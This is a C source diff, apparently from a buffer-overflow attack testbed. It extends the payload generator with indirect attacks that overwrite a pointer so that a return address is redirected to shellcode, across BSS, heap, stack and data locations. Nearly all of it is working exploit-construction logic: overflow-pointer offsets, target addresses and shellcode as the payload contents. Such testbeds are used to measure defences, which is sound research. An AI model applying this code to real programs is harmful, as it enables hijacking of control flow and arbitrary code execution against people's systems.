@@ -19,8 +19,6 @@ static char shellcode_no_noop[] =
 
 const size_t shellcode_no_noop_size = sizeof(shellcode_no_noop);
 
-const size_t STACK_BUFFER_SIZE = 1024;
-
 ATTACKFORM attack;
 
 CHARPAYLOAD payload;
@@ -31,13 +29,22 @@ void fooz() {
 
 struct attackme data_struct = {"AAAAAAAA", &fooz};
 
+struct pointer_struct data_indirect;
+
 void generate_payload() {
 
   static struct attackme bss_struct = {"AAAAAAAA", &fooz};
+
+  static struct pointer_struct bss_indirect = {"AAAAAAA", NULL};
   
   if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
     payload.overflow_ptr = payload.target_addr = bss_struct.buffer;
     payload.buffer = &bss_struct.func_ptr;
+  }
+  else if (attack.technique == INDIRECT && attack.location == BSS) {
+    payload.buffer = bss_indirect.buf;
+    payload.overflow_ptr = ((uintptr_t)(RET_ADDR_PTR) - 0x10);
+    payload.target_addr = &bss_indirect.mem_ptr;
   }
 
   size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(int);
@@ -72,14 +79,11 @@ boolean is_attack_possible() {
 
 int main() {  
 
-  char buf[STACK_BUFFER_SIZE];
+  char buf[BUFFER_SIZE];
 
-  struct package {
-    char buf[STACK_BUFFER_SIZE];
-    int* stack_mem_ptr;
-  };
+  struct pointer_struct stack_indirect;
 
-  struct package buf_struct;
+  struct pointer_struct* heap_indirect = (struct pointer_struct*) malloc(sizeof(struct pointer_struct));
 
   struct attackme stack_struct;
   stack_struct.func_ptr = &fooz;
@@ -89,7 +93,7 @@ int main() {
 
   attack.technique = INDIRECT;
   attack.code_ptr = RET_ADDR;
-  attack.location = STACK;
+  attack.location = BSS;
 
   payload.size = shellcode_no_noop_size;
 
@@ -105,20 +109,37 @@ int main() {
 
   if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
     payload.buffer = payload.overflow_ptr = stack_struct.buffer;
-  } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
+  }
+  else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
     payload.buffer = payload.overflow_ptr = heap_struct->buffer;
-  } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
+  }
+  else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
     payload.buffer = payload.overflow_ptr = data_struct.buffer;
-  } else if (attack.location == STACK) {
-    if(attack.technique == DIRECT) {
+  }
+  else if (attack.location == STACK) {
+    if (attack.technique == DIRECT) {
       payload.buffer = payload.overflow_ptr = buf;
-    } else {
-      payload.buffer = buf_struct.buf;
+    } else if (attack.technique == INDIRECT) {
+      payload.buffer = stack_indirect.buf;
       payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
-      payload.target_addr = &buf_struct.stack_mem_ptr;
+      payload.target_addr = &stack_indirect.mem_ptr;
     }
-  } else if (attack.location == HEAP) {
-    payload.buffer = payload.overflow_ptr = malloc(100);
+  }
+  else if (attack.location == HEAP) {
+    if (attack.technique == DIRECT) {
+      payload.buffer = payload.overflow_ptr = malloc(100);
+    } else if (attack.technique == INDIRECT) {
+      payload.buffer = heap_indirect->buf;
+      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
+      payload.target_addr = &heap_indirect->mem_ptr;
+    }
+  }
+  else if (attack.location == DATA) {
+    if(attack.technique == INDIRECT) {
+      payload.buffer = data_indirect.buf;
+      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
+      payload.target_addr = &data_indirect.mem_ptr;
+    }
   }
 
   payload.contents = shellcode_no_noop;
@@ -127,9 +148,9 @@ int main() {
 
   if (attack.technique == INDIRECT) {
     if (attack.location == STACK) {
-      *((int*) (buf_struct.stack_mem_ptr)) = (int) payload.buffer;
+      *((int*) (stack_indirect.mem_ptr)) = (int) payload.buffer;
       // done so that the compiler doesn't optimize away the write
-      printf("stack_mem_ptr val is %x\n", *buf_struct.stack_mem_ptr);
+      printf("stack_mem_ptr val is %x\n", *stack_indirect.mem_ptr);
     }
   }
 
